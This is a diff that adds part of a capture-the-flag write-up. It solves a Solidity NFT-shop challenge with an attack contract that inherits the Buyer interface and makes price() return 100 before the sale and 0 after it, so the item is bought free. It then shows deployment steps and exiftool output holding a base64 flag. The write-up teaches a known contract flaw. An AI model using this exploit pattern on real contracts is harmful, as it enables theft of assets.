@@ -248,3 +248,101 @@ contract.methods.price().call().then(function (price) {
 Now we know what to do. We have to change the value of isSold variable to true and manipulate the price of NFT. But how?
 In the contract, the Buyer interface is called two times. In the first call, we will use for a bypass this requirement. In the second call, we will decrease the price which we can afford it.
 Let’s transfer this code to EVM(Ethereum Virtual Machine) to use in attack code. 
+
+Firstly, we must import **shop.sol** in attacker file. Next, when we create the attack contract, we should use is parameter for inherit ```Buyer``` interface.Next, we defined an object named shop that can access functions and variables in **Shop** contract.Thereafter, we need to specify the target contract address beforehand in order for the attack contract to be called in future transactions. So should be use ```constructor``` expression.
+
+```solidity
+//SPDX-License-Identifier: MIT
+pragma solidity ^0.6.0;
+
+import './Shop.sol';
+
+contract AttackShop is Buyer{
+    Shop public shop;
+
+    constructor(Shop _shop) public{
+        shop= _shop;
+    }
+
+    function buy() public{
+        shop.buy();
+    }
+
+    function price() public view override returns(uint){
+        return shop.isSold() ? 0:100;
+    }
+}
+```
+buy() function calls buy() function which is in target code in another words click the **_Buy Now_** button.
+
+In the **price** function, where the magic begins, it is public and view. Hereby, it can interact with the target contract. Also, **override** specifically refers to inside the Buyer interface because interfaces are open to external calls. The important point is in the interface there is a price function. Furthermore, it is open to external calls too. In short, it is a **virtual(editable)** function and override helps us to re-write this function. 
+
+In the return part, there is a kind of logic calculation thats why basically we’re going to bring some things **back**.The critical part is there are ```ternary operators```. 
+Ternary operators get used like this.
+> conditional ? if-true : if-false
+
+In this challenge, conditional says if ```isSold``` equals **true**, then return **0** which is our aim to decrease the prize.If isSold equals **false**, it should return **100**. In this way, we can pass the first condition. Actually when amount was sent by attack contract, it is inadequate therefore it will return false from and attack contract **return 100** later it will call first time.Since it detects the amount sent as 100 and the isSold variable is false, it will have met the if condition . After passed the if part, buyer function call **again**.In this case, isSold variable is **true** and the price will return **0** and then NFT’s price will equals to zero.
+
+Let’s compile and deploy **_Shop_Attack.sol_** after connect the **MetaMask wallet**. It is important.
+
+<img src="https://miro.medium.com/max/630/1*w-GcCHRnsyoH7ZddQe-Jow.png">
+
+Copy the target contract address which is **0xbc9AdC8Dd14e89BE085f76a62F289cEb97D9f937** and paste into constructor.
+
+<img src="https://miro.medium.com/max/300/1*z3vYE2_N9YzGb6i7XVAwOg.png">
+
+Please confirmed it.
+
+<img src="https://miro.medium.com/max/300/1*Btxn8g9vlMIOmXNjqETPCw.png">
+
+<imh src="https://miro.medium.com/max/300/1*Lg9ELM3MVPEvgHWVZpv6Jw.png">
+
+Let’s click the buy button,confirm it.
+
+<img src="https://miro.medium.com/max/300/1*p9zorr689FCxzD-3RATzCQ.png">
+
+Result:
+
+<img src="https://miro.medium.com/max/300/1*bIPltGvlM2OTHBLkQh9leA.png">
+
+We have bought this NFT just free!
+
+When refresh the item.php page, it is automatically directed me avatar.php and download our NFT..
+
+<img src="https://miro.medium.com/max/630/1*xzvXGrtjmaUdwQJMb6oC1w.png">
+<img src="https://miro.medium.com/max/630/1*qVED5n5vlUfzzv-br99R1A.png">
+
+It gave me a pdf. Let’s look at the metadata of pdf.
+```powershell
+┌──(kali㉿kali)-[~/Pictures]
+└─$ ls
+𐱅𐰼𐰇𐰰.pdf
+                                                                                                                                                                                                                                            
+┌──(kali㉿kali)-[~/Pictures]
+└─$ exiftool 𐱅𐰼𐰇𐰰.pdf 
+ExifTool Version Number         : 12.41
+File Name                       : 𐱅𐰼𐰇𐰰.pdf
+Directory                       : .
+File Size                       : 604 KiB
+File Modification Date/Time     : 2022:08:26 18:41:53-04:00
+File Access Date/Time           : 2022:08:26 18:42:45-04:00
+File Inode Change Date/Time     : 2022:08:26 18:42:45-04:00
+File Permissions                : -rw-r--r--
+File Type                       : PDF
+File Type Extension             : pdf
+MIME Type                       : application/pdf
+PDF Version                     : 1.5
+Linearized                      : No
+Page Count                      : 1
+Language                        : en-US
+Tagged PDF                      : Yes
+Author                          : Hi Exit
+Create Date                     : 2022:05:23 00:16:19+02:00
+Producer                        : 
+Modify Date                     : 2022:05:23 00:16:19+02:00
+Keywords                        : RkxBR3tvcHBvcnR1bmlzdF93ZWIzaGFja2VyIX0=
+Title                           : 
+Subject                         : 
+Creator                         : 
+```
+In the keywords, there is hash encoded with base64. Let’s decode it and get the flag.
